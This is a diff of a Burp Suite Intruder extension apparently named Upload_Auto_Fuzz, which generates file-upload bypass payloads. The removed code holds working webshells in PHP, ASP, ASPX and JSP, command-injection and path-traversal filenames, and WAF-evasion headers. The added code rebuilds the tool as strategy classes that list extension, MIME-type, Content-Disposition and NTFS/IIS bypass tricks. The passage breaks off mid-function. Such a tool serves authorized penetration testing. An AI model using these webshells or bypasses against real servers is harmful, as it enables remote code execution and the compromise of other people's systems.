-                                                                 'filename="{}="'.format(double_encoded)))
-                
-                # Base64编码后的多种变种
-                defense_payload.append(TEMP_TEMPLATE_SUFFIX.replace(filename_total,
-                                                                 'filename="data:text/plain;base64,{}"'.format(encoded_name)))
-                
-                # 添加更多编码Header
-                encoded_headers = [
-                    'X-Encoded-Content: {}\r\n'.format(base64.b64encode('Content-Type: text/html')),
-                    'X-Encoded-Path: {}\r\n'.format(base64.b64encode('/var/www/html')),
-                    'X-Encoded-Command: {}\r\n'.format(base64.b64encode('exec')),
-                    'X-Encoded-Upload: {}\r\n'.format(base64.b64encode('filetype=allowed'))
-                ]
-                
-                for encoded_header in encoded_headers:
-                    defense_payload.append(TEMP_TEMPLATE_SUFFIX.replace('Content-Type:', 
-                                                                     encoded_header + 'Content-Type:'))
-            
-            # 4. 新一代WAF对抗技术
-            # 使用预定义的垃圾数据而非随机生成
-            if 'Content-Disposition:' in TEMP_TEMPLATE_SUFFIX:
-                # 预定义的垃圾数据模板
-                noise_templates = [
-                    'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789',
-                    'Lorem ipsum dolor sit amet consectetur adipiscing elit',
-                    'X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*',
-                    '<svg><![CDATA[<]]>script>alert(1)<![CDATA[>]]></svg>',
-                    '<!-- Comment Block: Ignore this data block for security scanning -->',
-                    '#pragma once /* C style preprocessor directive */'
-                ]
-                
-                # 创建多种混淆头部
-                prefixes = ['xrd', 'tmp', 'usr', 'etc', 'var', 'opt', 'sys', 'bin', 'dev', 'lib']
-                
-                # 为每个前缀和模板组合创建混淆头
-                for prefix in prefixes[:5]:  # 限制数量
-                    for template in noise_templates[:3]:  # 限制数量
-                        defense_payload.append(TEMP_TEMPLATE_SUFFIX.replace('Content-Disposition:', 
-                                                                        'X-{}-Data: {}\r\nContent-Disposition:'.format(prefix, template)))
-            
-            # 5. 高级漏洞链组合
-            # 组合多种技术，不限于PHP
-            combined_attacks = [
-                'filename="../../../../proc/self/environ/shell.{}"'.format(each_suffix),
-                'filename="file:///etc/passwd/shell.{}"'.format(each_suffix),
-                'filename="/dev/null;shell.{}"'.format(each_suffix),
-                'filename="http://127.0.0.1/shell.{}"'.format(each_suffix),
-                'filename="|echo PD9waHAg...>{0}"'.format(each_suffix),  # 管道命令注入
-                'filename="shell.{0}.%00.jpg"'.format(each_suffix),  # 空字节与双扩展名
-                'filename="{0} -o- > shell.txt"'.format(each_suffix),  # 命令参数注入
-                'filename="/tmp/.\\./.\\./shell.{0}"'.format(each_suffix)  # 复杂路径混淆
-            ]
-            
-            # 对应文件类型的特定攻击
-            if each_suffix == 'php':
-                php_specific = [
-                    'filename="php://filter/convert.base64-encode/resource=shell.php"',
-                    'filename="data:image/jpeg;php://filter/shell.php"',
-                    'filename="expect://id>shell.php"',
-                    'filename="/tmp/.././../var/www/shell.php${IFS}"'  # 命令注入+路径操作
-                ]
-                combined_attacks.extend(php_specific)
-            elif each_suffix == 'asp' or each_suffix == 'aspx':
-                asp_specific = [
-                    'filename="file.asp::.jpg"',  # NTFS ADS
-                    'filename="shell.asp%16"',    # URL编码变体
-                    'filename="shell.;asp;"'      # IIS分号绕过
-                ]
-                combined_attacks.extend(asp_specific)
-                
-            for attack in combined_attacks:
-                defense_payload.append(TEMP_TEMPLATE_SUFFIX.replace(filename_total, attack))
-        
-        print "Advanced Defense Evasion generated %d payloads" % len(defense_payload)
-        return defense_payload
-
-    # 调用所有Fuzz函数并合并结果
-    suffix_payload = script_suffix_Fuzz()
-    Content_Disposition_payload = CFF_Fuzz()
-    content_type_payload = content_type_Fuzz()
-    windows_payload = windows_features_Fuzz()
-    linux_payload = linux_features_Fuzz()
-    magic_bytes_payload = magic_bytes_Fuzz()
-    content_trick_payload = file_content_trick_Fuzz()
-    user_ini_payload = user_ini_Fuzz()
-    mime_payload = mime_encoding_Fuzz()
-    http_split_payload = http_protocol_split_Fuzz()
-    chunked_payload = chunked_encoding_Fuzz()
-    waf_bypass_payload = waf_bypass_Fuzz()
-    unicode_payload = unicode_normalization_Fuzz()
-    header_smuggling_payload = http_header_smuggling_Fuzz()
-    null_byte_payload = null_byte_variations_Fuzz()
-    protocol_payload = protocol_handler_Fuzz()
-    svg_xss_payload = svg_xss_Fuzz()
-    webdav_payload = webdav_method_Fuzz()
-    file_content_bypass_payload = file_content_bypass_Fuzz()
-    char_mutation_payload = character_mutation_Fuzz()
-    data_overflow_payload = data_overflow_Fuzz()
-    advanced_mutation_payload = advanced_character_mutation_Fuzz()
-    cloud_environment_payload = cloud_environment_bypass_Fuzz()
-    advanced_defense_payload = advanced_defense_evasion_Fuzz()
-
-    # 合并所有payload
-    attackPayloads = (suffix_payload + Content_Disposition_payload + content_type_payload + 
-                     windows_payload + linux_payload + magic_bytes_payload + 
-                     content_trick_payload + user_ini_payload + mime_payload + 
-                     http_split_payload + chunked_payload + waf_bypass_payload +
-                     unicode_payload + header_smuggling_payload + null_byte_payload +
-                     protocol_payload + svg_xss_payload + webdav_payload +
-                     file_content_bypass_payload + char_mutation_payload + 
-                     data_overflow_payload + advanced_mutation_payload +
-                     cloud_environment_payload + advanced_defense_payload)
+def compute_payload_hash(payload):
+    """
+    Compute a unique hash for payload deduplication.
     
-    # 去除重复的payload
-    unique_payloads = []
-    seen_payloads = set()
+    Args:
+        payload: The payload string
     
-    for payload in attackPayloads:
-        # 使用payload的字符串表示来判断是否重复
-        payload_str = str(payload)
-        if payload_str not in seen_payloads:
-            seen_payloads.add(payload_str)
-            unique_payloads.append(payload)
+    Returns:
+        MD5 hash string of the payload
+    """
+    if isinstance(payload, unicode):
+        payload = payload.encode('utf-8')
+    return hashlib.md5(payload).hexdigest()
+
+
+def safe_regex_search(pattern, text, default=None):
+    """
+    Safely perform regex search with error handling.
     
-    print "Total unique payloads: %d" % len(unique_payloads)
-    return unique_payloads
-
-class BurpExtender(IBurpExtender, IIntruderPayloadGeneratorFactory):
-    def registerExtenderCallbacks(self, callbacks):
-        self._callbacks = callbacks
-        self._helpers = callbacks.getHelpers()
-        callbacks.setExtensionName("Upload_Auto_Fuzz 1.1.0")
-        # 注册payload生成器
-        callbacks.registerIntruderPayloadGeneratorFactory(self)
-        print '==================================='
-        print '[ UAF Load successful ]'
-        print '[#]  Author: T3nk0'
-        print '[#]  Github: https://github.com/T3nk0/Upload_Auto_Fuzz'
-        print '[#]  Version: 1.1.0'
-        print '===================================\n'
-
-    # 设置payload生成器名字，作为选项显示在Intruder UI中。
-    def getGeneratorName(self):
-        return "Upload_Auto_Fuzz"
-
-    # 创建payload生成器实例，传入的attack是IIntruderAttack的实例
-    def createNewInstance(self, attack):
-        return demoFuzzer(self, attack)
-
-# 继承IIntruderPayloadGenerator类
-class demoFuzzer(IIntruderPayloadGenerator):
-    def __init__(self, extender, attack):
-        self._extender = extender
-        self._helpers = extender._helpers
-        self._attack = attack
-        self.num_payloads = 0  # payload使用了的次数
-        self._payloadIndex = 0
-        self.attackPayloads = [1]  # 初始化为非空列表，保持原始代码的方式
-
-    # hasMorePayloads返回一个bool值，如果返回false就不在继续返回下一个payload，如果返回true就返回下一个payload
-    def hasMorePayloads(self):
-        # print "hasMorePayloads called."
-        return self._payloadIndex < len(self.attackPayloads)
-
-    # 获取下一个payload，然后intruder就会用该payload发送请求
-    def getNextPayload(self, baseValue):
-        # 将baseValue转换为字符串
-        selected_area = "".join(chr(x) for x in baseValue)
-        
-        if self._payloadIndex == 0:
-            # 检查是否选择了整个区域
-            is_full_section = ('Content-Disposition:' in selected_area and 
-                               ('filename=' in selected_area or 'filename="' in selected_area) and
-                               'Content-Type:' in selected_area)
-            
-            if is_full_section:
-                # 提取文件名和扩展名
-                filename_match = re.search(r'filename="([^"]*)"', selected_area)
-                if filename_match and '.' in filename_match.group(1):
-                    original_filename = filename_match.group(1)
-                    original_ext = original_filename.split('.')[-1]
-                    
-                    # 使用两种方法结合：
-                    # 1. 专门为整个区域设计的payload
-                    section_payloads = getFuzzPayloadsForFullSection(selected_area)
-                    
-                    # 2. 将原始的单个元素payload转换为整个区域payload
-                    # 创建一个模板，稍后用于替换
-                    template_area = selected_area
-                    
-                    # 基于original_ext生成标准的攻击payload
-                    single_element_payloads = getAttackPayloads(
-                        "Content-Disposition: form-data; name=\"uploaded\"; filename=\"test.{}\"\r\nContent-Type: text/plain".format(original_ext)
-                    )
-                    
-                    # 转换单元素payload为整个区域payload
-                    converted_payloads = []
-                    for single_payload in single_element_payloads:
-                        # 提取修改后的文件名和Content-Type
-                        payload_filename = re.search(r'filename="([^"]*)"', single_payload)
-                        payload_content_type = re.search(r'Content-Type: ([^\r\n]*)', single_payload)
-                        
-                        if payload_filename:
-                            # 替换原始选中区域中的文件名
-                            new_area = re.sub(
-                                r'filename="[^"]*"', 
-                                payload_filename.group(0), 
-                                template_area
-                            )
-                            
-                            # 如果Content-Type也变了，一并替换
-                            if payload_content_type:
-                                new_area = re.sub(
-                                    r'Content-Type: [^\r\n]*', 
-                                    'Content-Type: {}'.format(payload_content_type.group(1)), 
-                                    new_area
-                                )
-                            
-                            converted_payloads.append(new_area)
-                    
-                    # 合并两种payload集合并去重
-                    all_payloads = section_payloads + converted_payloads
-                    self.attackPayloads = list(set(all_payloads))  # 这种方式可能不适用于所有情况
-                else:
-                    # 如果没有找到文件名，只使用区域payload
-                    self.attackPayloads = getFuzzPayloadsForFullSection(selected_area)
-            else:
-                # 使用原来的方法生成payload
-                self.attackPayloads = getAttackPayloads(selected_area)
-            
-            # 去除重复的payload (更可靠的方法)
-            unique_payloads = []
-            seen_payloads = set()
-            
-            for payload in self.attackPayloads:
-                # 使用payload的哈希值来判断是否重复
-                payload_hash = hash(str(payload))
-                if payload_hash not in seen_payloads:
-                    seen_payloads.add(payload_hash)
-                    unique_payloads.append(payload)
-            
-            self.attackPayloads = unique_payloads
-            
-            # 限制payload数量防止内存溢出
-            if len(self.attackPayloads) > 1000:
-                self.attackPayloads = self.attackPayloads[:1000]
-            print "Generated %d unique payloads" % len(self.attackPayloads)
-
-        payload = self.attackPayloads[self._payloadIndex]
-        self._payloadIndex = self._payloadIndex + 1
-
-        return payload
-
-    # 清空，以便下一次调用 getNextPayload()再次返回第一个有效负载。
-    def reset(self):
-        # print "reset called."
-        self._payloadIndex = 0
-        return
-
-def getFuzzPayloadsForFullSection(selected_area):
-    # 为整个选中区域生成有效载荷
-    full_section_payloads = []
+    Args:
+        pattern: Regex pattern string
+        text: Text to search in
+        default: Default value if no match found
     
-    # 尝试提取文件名和内容部分
-    filename_match = re.search(r'filename="([^"]*)"', selected_area)
-    content_part_match = re.search(r'Content-Type:.*?\r\n\r\n(.*?)$', selected_area, re.DOTALL)
+    Returns:
+        Match object or default value
+    """
+    try:
+        match = re.search(pattern, text, re.DOTALL)
+        return match if match else default
+    except re.error as e:
+        Logger.error("Regex error: {}".format(str(e)))
+        return default
+
+
+def extract_filename_parts(template):
+    """
+    Extract filename and extension from Content-Disposition header.
     
-    if not filename_match or not content_part_match:
-        # 如果找不到关键部分，返回空列表
-        return [selected_area]  # 至少返回原始选择
+    Args:
+        template: HTTP request template containing Content-Disposition
     
-    original_filename = filename_match.group(1)
-    original_content = content_part_match.group(1)
-    
-    # 提取文件扩展名
-    if '.' in original_filename:
-        filename_suffix = original_filename.split('.')[-1]
-    else:
-        filename_suffix = ""
-    
-    # 为不同类型的文件准备WebShell内容
-    webshell_contents = {
-        'php': [
-            '<?php eval($_POST["cmd"]); ?>',
-            '<?php system($_REQUEST["cmd"]); ?>'
-        ],
-        'asp': [
-            '<%eval request("cmd")%>',
-            '<%execute request("cmd")%>'
-        ],
-        'aspx': [
-            '<%@ Page Language="C#" %><%System.Diagnostics.Process.Start("cmd.exe","/c "+Request["cmd"]);%>',
-            '<%@ Page Language="C#" %><%eval(Request.Item["cmd"]);%>',
-            '<%@ Page Language="C#" %><% System.IO.StreamWriter sw=new System.IO.StreamWriter(Request.Form["f"]);sw.Write(Request.Form["c"]);sw.Close(); %>',
-            '<%@ Page Language="Jscript"%><%eval(Request.Item["cmd"],"unsafe");%>'
-        ],
-        'jsp': [
-            '<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>',
-            '<%=Runtime.getRuntime().exec(request.getParameter("cmd"))%>',
-            '<% out.println("Output: " + request.getParameter("cmd")); %>',
-            '<%! public void jspInit(){ try{ java.lang.Runtime.getRuntime().exec(request.getParameter("cmd")); }catch(Exception e){} } %>'
-        ]
-    }
-    
-    # WAF绕过前缀
-    waf_bypass_prefixes = [
-        'GIF89a;\n',
-        '#!MIME type image/gif\n',
-        '<!--\n',
-        '%PDF-1.5\n'
+    Returns:
+        Tuple of (full_filename, extension, filename_match_group)
+        Returns (None, None, None) if extraction fails
+    """
+    # Try different filename patterns
+    patterns = [
+        r'filename="([^"]+)"',      # Standard: filename="test.jpg"
+        r"filename='([^']+)'",      # Single quotes: filename='test.jpg'
+        r'filename=([^\s;]+)',      # No quotes: filename=test.jpg
     ]
     
-    # 针对常见的可执行文件扩展名
-    for ext in ['php', 'asp', 'aspx', 'jsp']:
-        # 替换文件名
-        new_area = selected_area.replace('filename="{}"'.format(original_filename), 
-                                         'filename="shell.{}"'.format(ext))
-        
-        # 如果有对应的WebShell内容
-        if ext in webshell_contents:
-            for content in webshell_contents[ext][:2]:  # 每种类型限制2个变体
-                # 完全替换原始内容
-                if original_content:
-                    new_area_with_content = re.sub(
-                        r'Content-Type:.*?\r\n\r\n.*?$',
-                        r'Content-Type: text/plain\r\n\r\n{}'.format(content),
-                        new_area,
-                        flags=re.DOTALL
-                    )
-                    full_section_payloads.append(new_area_with_content)
-                    
-                    # 使用WAF绕过前缀
-                    for prefix in waf_bypass_prefixes:
-                        new_area_with_prefix = re.sub(
-                            r'Content-Type:.*?\r\n\r\n.*?$',
-                            r'Content-Type: text/plain\r\n\r\n{}{}'.format(prefix, content),
-                            new_area,
-                            flags=re.DOTALL
-                        )
-                        full_section_payloads.append(new_area_with_prefix)
+    for pattern in patterns:
+        match = safe_regex_search(pattern, template)
+        if match:
+            filename = match.group(1)
+            if '.' in filename:
+                ext = filename.rsplit('.', 1)[-1]
+                return filename, ext, match.group(0)
+            return filename, '', match.group(0)
     
-    # 去除重复的payload
-    unique_payloads = []
-    seen_payloads = set()
-    
-    for payload in full_section_payloads:
-        payload_str = str(payload)
-        if payload_str not in seen_payloads:
-            seen_payloads.add(payload_str)
-            unique_payloads.append(payload)
-    
-    return unique_payloads
+    return None, None, None
 
+
+def extract_content_type(template):
+    """
+    Extract Content-Type value from template.
+    
+    Args:
+        template: HTTP request template
+    
+    Returns:
+        Content-Type string or None
+    """
+    match = safe_regex_search(r'Content-Type:\s*([^\r\n]+)', template)
+    return match.group(1).strip() if match else None
+
+
+# =============================================================================
+# Payload Generation Configuration
+# =============================================================================
+
+class FuzzConfig(object):
+    """
+    Configuration container for payload generation.
+    Implements Singleton pattern for global access within a session.
+    """
+    
+    _instance = None
+    
+    def __new__(cls, force_new=False):
+        """
+        Create or return singleton instance.
+        
+        Args:
+            force_new: If True, create a new instance (for testing)
+        """
+        if cls._instance is None or force_new:
+            cls._instance = object.__new__(cls)
+            cls._instance._initialized = False
+        return cls._instance
+    
+    def __init__(self, force_new=False):
+        if self._initialized and not force_new:
+            return
+        
+        # Target languages to test (default: all)
+        self.target_languages = ['php', 'asp', 'aspx', 'jsp']
+        
+        # Enabled strategy categories (default: all enabled)
+        self.enabled_strategies = {
+            'suffix': True,
+            'content_disposition': True,
+            'content_type': True,
+            'windows_features': True,
+            'linux_features': True,
+            'magic_bytes': True,
+            'null_byte': True,
+            'double_extension': True,
+            'case_variation': True,
+            'special_chars': True,
+            'encoding': True,
+            'waf_bypass': True,
+            'webshell_content': True,
+            'config_files': True,
+        }
+        
+        # Maximum payloads to generate (default: 2000)
+        self.max_payloads = MAX_PAYLOADS_DEFAULT
+        
+        # Include webshell content in payloads
+        self.include_webshell = True
+        
+        self._initialized = True
+    
+    @classmethod
+    def reset(cls):
+        """Reset the singleton instance (useful for testing)."""
+        cls._instance = None
+    
+    def set_target_languages(self, languages):
+        """Set target backend languages."""
+        valid_langs = [l for l in languages if l in BACKEND_LANGUAGES]
+        if valid_langs:
+            self.target_languages = valid_langs
+    
+    def enable_strategy(self, strategy_name, enabled=True):
+        """Enable or disable a specific strategy."""
+        if strategy_name in self.enabled_strategies:
+            self.enabled_strategies[strategy_name] = enabled
+    
+    def is_strategy_enabled(self, strategy_name):
+        """Check if a strategy is enabled."""
+        return self.enabled_strategies.get(strategy_name, False)
+
+
+# =============================================================================
+# Abstract Base Strategy
+# =============================================================================
+
+class FuzzStrategy(object):
+    """
+    Abstract base class for all fuzzing strategies.
+    
+    Each strategy encapsulates a specific bypass technique and generates
+    payloads accordingly. Strategies are designed to be composable and
+    independently testable.
+    """
+    
+    __metaclass__ = ABCMeta
+    
+    # Strategy metadata
+    name = "base"
+    description = "Base fuzzing strategy"
+    category = "general"
+    
+    def __init__(self, config=None):
+        """
+        Initialize strategy with configuration.
+        
+        Args:
+            config: FuzzConfig instance or None for default
+        """
+        self.config = config or FuzzConfig()
+    
+    @abstractmethod
+    def generate(self, template, filename, extension, content_type):
+        """
+        Generate payloads for this strategy.
+        
+        Args:
+            template: Original HTTP request template
+            filename: Original filename (e.g., "test.jpg")
+            extension: Original file extension (e.g., "jpg")
+            content_type: Original Content-Type value
+        
+        Yields:
+            Modified template strings as payloads
+        """
+        pass
+    
+    def _replace_filename(self, template, old_filename_match, new_filename):
+        """
+        Helper to replace filename in template.
+        
+        Args:
+            template: Original template
+            old_filename_match: The matched filename string (e.g., 'filename="test.jpg"')
+            new_filename: New filename to use
+        
+        Returns:
+            Modified template string
+        """
+        new_match = 'filename="{}"'.format(new_filename)
+        return template.replace(old_filename_match, new_match)
+    
+    def _replace_content_type(self, template, old_ct, new_ct):
+        """
+        Helper to replace Content-Type in template.
+        
+        Args:
+            template: Original template
+            old_ct: Old Content-Type value
+            new_ct: New Content-Type value
+        
+        Returns:
+            Modified template string
+        """
+        return template.replace(
+            'Content-Type: {}'.format(old_ct),
+            'Content-Type: {}'.format(new_ct)
+        )
+    
+    def _get_target_extensions(self):
+        """Get list of target extensions based on configured languages."""
+        extensions = []
+        for lang in self.config.target_languages:
+            if lang in BACKEND_LANGUAGES:
+                extensions.extend(BACKEND_LANGUAGES[lang])
+        return list(set(extensions))
+
+
+# =============================================================================
+# Concrete Fuzzing Strategies
+# =============================================================================
+
+class SuffixBypassStrategy(FuzzStrategy):
+    """
+    Strategy for file extension/suffix bypass techniques.
+    
+    Techniques include:
+    - Alternative executable extensions
+    - Case variations
+    - Null byte injection
+    - Double extensions
+    - Special character injection
+    """
+    
+    name = "suffix"
+    description = "File extension bypass techniques"
+    category = "suffix"
+    
+    # Extension bypass patterns: {language: [bypass_patterns]}
+    BYPASS_PATTERNS = {
+        'php': [
+            # Alternative extensions
+            'php3', 'php4', 'php5', 'php7', 'php8', 'phtml', 'pht', 'phar', 'phps',
+            'php1', 'php2', 'pgif',
+            # Case variations
+            'pHp', 'PhP', 'PHP', 'pHP', 'PHp', 'phP',
+            # 双写绕过
+            'pphphp', 'phphpp', 'pphp',
+            # Null byte variations
+            'php%00', 'php%00.jpg', 'php\x00.jpg',
+            # Double extensions
+            'php.jpg', 'php.png', 'php.gif', 'jpg.php', 'png.php',
+            # Special characters
+            'php ', 'php.', 'php..', 'php::$DATA', 'php:$DATA',
+            # Semicolon bypass (IIS)
+            'php;.jpg', 'php;jpg', 'php;.png',
+            # Path separator tricks
+            'php/.jpg', 'php\\.jpg',
+            # Encoding tricks
+            'p%68p', '%70hp', 'ph%70',
+            # 文件名中间插入特殊字符
+            'p;hp', 'p hp', 'ph p', 'p.hp',
+        ],
+        'asp': [
+            'asa', 'cer', 'cdx', 'htr',
+            'asp ', 'asp.', 'asp;.jpg', 'asp;jpg',
+            'asp%00', 'asp%00.jpg', 'asp::$DATA',
+            'aSp', 'AsP', 'ASP', 'aSP', 'Asp',
+            # 双写绕过
+            'aspasp', 'aasps', 'aspas',
+            # 文件名中间插入特殊字符
+            'a;sp', 'as p', 'a.sp',
+        ],
+        'aspx': [
+            'ashx', 'asmx', 'asax', 'ascx', 'soap', 'rem', 'axd',
+            'aspx ', 'aspx.', 'aspx;.jpg',
+            'aSpX', 'ASPX', 'AsPx', 'ASpx', 'aspX',
+            # 双写绕过
+            'aspxaspx', 'aaspxspx',
+        ],
+        'jsp': [
+            'jspa', 'jsps', 'jspx', 'jspf', 'jsw', 'jsv', 'jtml',
+            'jsp ', 'jsp.', 'jsp;.jpg',
+            'jSp', 'JsP', 'JSP', 'jSP', 'Jsp',
+            'jsp%00', 'jsp%00.jpg',
+            # 双写绕过
+            'jspjsp', 'jjsps',
+        ],
+    }
+    
+    def generate(self, template, filename, extension, content_type):
+        """Generate suffix bypass payloads."""
+        _, _, filename_match = extract_filename_parts(template)
+        if not filename_match:
+            return
+        
+        base_name = filename.rsplit('.', 1)[0] if '.' in filename else filename
+        generated = set()
+        
+        for lang in self.config.target_languages:
+            if lang not in self.BYPASS_PATTERNS:
+                continue
+            
+            for pattern in self.BYPASS_PATTERNS[lang]:
+                new_filename = "{}.{}".format(base_name, pattern)
+                
+                # Skip if already generated
+                if new_filename in generated:
+                    continue
+                generated.add(new_filename)
+                
+                # Truncate if too long
+                if len(new_filename) > MAX_FILENAME_LENGTH:
+                    continue
+                
+                yield self._replace_filename(template, filename_match, new_filename)
+
+
+class ContentDispositionStrategy(FuzzStrategy):
+    """
+    Strategy for Content-Disposition header manipulation.
+    
+    Techniques include:
+    - Header name case variations
+    - Spacing manipulation
+    - Quote variations
+    - Multiple filename parameters
+    - Special character injection
+    - form-data pollution
+    """
+    
+    name = "content_disposition"
+    description = "Content-Disposition header bypass techniques"
+    category = "content_disposition"
+    
+    def generate(self, template, filename, extension, content_type):
+        """Generate Content-Disposition bypass payloads."""
+        _, _, filename_match = extract_filename_parts(template)
+        if not filename_match:
+            return
+        
+        base_name = filename.rsplit('.', 1)[0] if '.' in filename else filename
+        
+        for lang in self.config.target_languages:
+            ext = BACKEND_LANGUAGES[lang][0]  # Primary extension
+            
+            # Case variations for Content-Disposition
+            cd_variations = [
+                ('Content-Disposition', 'content-disposition'),
+                ('Content-Disposition', 'CONTENT-DISPOSITION'),
+                ('Content-Disposition', 'Content-disposition'),
+                ('Content-Disposition', 'ConTENT-DisPoSition'),  # 混合大小写
+                ('Content-Disposition: ', 'Content-Disposition:'),
+                ('Content-Disposition: ', 'Content-Disposition:  '),
+                ('Content-Disposition: ', 'Content-Disposition:\t'),
+            ]
+            
+            for old, new in cd_variations:
+                if old in template:
+                    modified = template.replace(old, new)
+                    modified = self._replace_filename(modified, filename_match, 
+                                                     "{}.{}".format(base_name, ext))
+                    yield modified
+            
+            # form-data variations
+            fd_variations = [
+                ('form-data', 'Form-Data'),
+                ('form-data', 'FORM-DATA'),
+                ('form-data', 'form-Data'),
+                ('form-data', 'form-datA'),
+                ('form-data; ', 'form-data;'),
+                ('form-data; ', 'form-data;  '),
+                ('form-data', '*'),
+                ('form-data', 'f+orm-data'),
+                # form-data 污染 - 替换为脏数据
+                ('form-data', 'AAAA="BBBB"'),
+                # 删除 form-data
+                ('form-data; ', ''),
+                # 多分号污染
+                ('form-data;', 'form-data;;;;;;;;;;'),
+                ('form-data;', 'form-datA*;;;;;;;;;;'),
+            ]
+            
+            for old, new in fd_variations:
+                if old in template:
+                    modified = template.replace(old, new)
+                    modified = self._replace_filename(modified, filename_match,
+                                                     "{}.{}".format(base_name, ext))
+                    yield modified
+            
+            # Filename parameter variations
+            filename_variations = [
+                # Quote variations
+                'filename={}.{}'.format(base_name, ext),
+                "filename='{}.{}'".format(base_name, ext),
+                'filename=`{}.{}`'.format(base_name, ext),
+                # 未闭合引号
+                'filename="{}.{}'.format(base_name, ext),
+                "filename='{}.{}".format(base_name, ext),
+                'filename="{}.{}\''.format(base_name, ext),  # 混合引号
+                # Multiple equals
+                'filename=="{}.{}"'.format(base_name, ext),
+                'filename==="{}.{}"'.format(base_name, ext),
+                'filename===="{}.{}"'.format(base_name, ext),
+                # 超多等号
+                'filename' + '=' * 50 + '"{}.{}"'.format(base_name, ext),
+                # Newline injection
+                'filename="{}.{}"\n'.format(base_name, ext),
+                'filename\n="{}.{}"'.format(base_name, ext),
+                'filename=\n"{}.{}"'.format(base_name, ext),
+                # Double filename (parameter pollution)
+                'filename="safe.jpg"; filename="{}.{}"'.format(base_name, ext),
+                'filename="{}.{}"; filename="safe.jpg"'.format(base_name, ext),
+                'filename="1.jpg";filename="{}.{}"'.format(base_name, ext),
+                # 空 filename 在前
+                'filename= ;filename="{}.{}"'.format(base_name, ext),
+                'filename="";filename="{}.{}"'.format(base_name, ext),
+                # Backslash
+                'filename="{}\\{}"'.format(base_name, ext),
+                # 多分号污染
+                'filename;;;;="{}.{}"'.format(base_name, ext),
+                'filename;;;;;;;;;;;;;;="{}.{}"'.format(base_name, ext),
+                # name 参数污染
+                'name="file";;;;;;;;;;;; filename="{}.{}"'.format(base_name, ext),
+            ]
+            
+            for variation in filename_variations:
+                yield template.replace(filename_match, variation)
+
+
+class ContentTypeStrategy(FuzzStrategy):
+    """
+    Strategy for Content-Type header manipulation.
+    
+    Techniques include:
+    - MIME type spoofing
+    - Header case variations
+    - Empty/missing Content-Type
+    - URL encoded Content-Type
+    - Duplicate Content-Type headers
+    """
+    
+    name = "content_type"
+    description = "Content-Type header bypass techniques"
+    category = "content_type"
+    
+    # MIME types to try
+    MIME_TYPES = [
+        'image/jpeg', 'image/png', 'image/gif', 'image/bmp',
+        'image/webp', 'image/svg+xml', 'image/tiff',
+        'text/plain', 'text/html',
+        'application/octet-stream',
+        'application/x-httpd-php',
+        'application/x-php',
+        'application/x-asp',
+        'multipart/form-data',
+        # 可执行类型伪装为图片
+        'image/php',
+        'image/asp',
+        'image/aspx',
+        'image/jsp',
+    ]
+    
+    def generate(self, template, filename, extension, content_type):
+        """Generate Content-Type bypass payloads."""
+        if not content_type:
+            return
+        
+        _, _, filename_match = extract_filename_parts(template)
+        if not filename_match:
+            return
+        
+        base_name = filename.rsplit('.', 1)[0] if '.' in filename else filename
+        
+        for lang in self.config.target_languages:
+            ext = BACKEND_LANGUAGES[lang][0]
+            
+            # Replace filename first
+            modified_template = self._replace_filename(template, filename_match,
+                                                       "{}.{}".format(base_name, ext))
+            
+            # Try different MIME types
+            for mime in self.MIME_TYPES:
+                yield self._replace_content_type(modified_template, content_type, mime)
+            
+            # URL encoded Content-Type
+            url_encoded_types = [
+                'image%2Fgif',
+                'image%2Fjpeg',
+                'image%2Fphp',
+                'image%2F{}'.format(ext),
+            ]
+            for encoded_type in url_encoded_types:
+                yield self._replace_content_type(modified_template, content_type, encoded_type)
+            
+            # Empty Content-Type
+            yield modified_template.replace('Content-Type: {}'.format(content_type), '')
+            
+            # Case variations
+            ct_variations = [
+                ('Content-Type:', 'content-type:'),
+                ('Content-Type:', 'CONTENT-TYPE:'),
+                ('Content-Type: ', 'Content-Type:'),
+                ('Content-Type: ', 'Content-Type:  '),
+            ]
+            
+            for old, new in ct_variations:
+                if old in modified_template:
+                    yield modified_template.replace(old, new)
+            
+            # Duplicate Content-Type header (第二个覆盖第一个)
+            if 'Content-Type:' in modified_template:
+                # 在原 Content-Type 前添加一个
+                double_ct = modified_template.replace(
+                    'Content-Type: {}'.format(content_type),
+                    'Content-Type: image/gif\r\nContent-Type: {}'.format(content_type)
+                )
+                yield double_ct
+        
+        # 不改文件名，只改 Content-Type 为可执行类型
+        executable_types = [
+            'application/x-httpd-php',
+            'application/x-php',
+            'text/x-php',
+            'application/x-asp',
+            'application/x-aspx',
+        ]
+        for exec_type in executable_types:
+            yield self._replace_content_type(template, content_type, exec_type)
+
+
+class WindowsFeaturesStrategy(FuzzStrategy):
+    """
+    Strategy exploiting Windows filesystem features.
+    
+    Techniques include:
+    - NTFS Alternate Data Streams (ADS)
+    - Short filename (8.3) format
+    - Reserved device names
+    - Path separator tricks
+    """
+    
+    name = "windows_features"
+    description = "Windows filesystem bypass techniques"
+    category = "windows_features"
+    
+    # Windows reserved device names
+    RESERVED_NAMES = ['con', 'aux', 'nul', 'prn', 'com1', 'com2', 'lpt1', 'lpt2']
+    
+    def generate(self, template, filename, extension, content_type):
+        """Generate Windows-specific bypass payloads."""
+        _, _, filename_match = extract_filename_parts(template)
+        if not filename_match:
+            return
+        
+        base_name = filename.rsplit('.', 1)[0] if '.' in filename else filename
+        
+        for lang in self.config.target_languages:
+            ext = BACKEND_LANGUAGES[lang][0]
+            
+            # NTFS Alternate Data Streams
+            ads_patterns = [
+                '{}.{}::$DATA'.format(base_name, ext),
+                '{}.{}::$DATA......'.format(base_name, ext),
+                '{}:{}'.format(base_name, ext),
+            ]
+            
+            for pattern in ads_patterns:
+                yield self._replace_filename(template, filename_match, pattern)
+            
+            # IIS semicolon bypass
+            iis_patterns = [
+                '{}.{};.jpg'.format(base_name, ext),
+                '{}.{};.png'.format(base_name, ext),
+                '{}.{};jpg'.format(base_name, ext),
+            ]
+            
+            for pattern in iis_patterns:
+                yield self._replace_filename(template, filename_match, pattern)
+            
+            # Reserved device names
+            for device in self.RESERVED_NAMES:
+                yield self._replace_filename(template, filename_match,
+                                            '{}.{}'.format(device, ext))
+            
+            # Trailing dots and spaces (Windows strips these)
+            trailing_patterns = [
+                '{}.{}.'.format(base_name, ext),
+                '{}.{}..'.format(base_name, ext),
+                '{}.{} '.format(base_name, ext),
+                '{}.{}. . .'.format(base_name, ext),
+            ]
+            
+            for pattern in trailing_patterns:
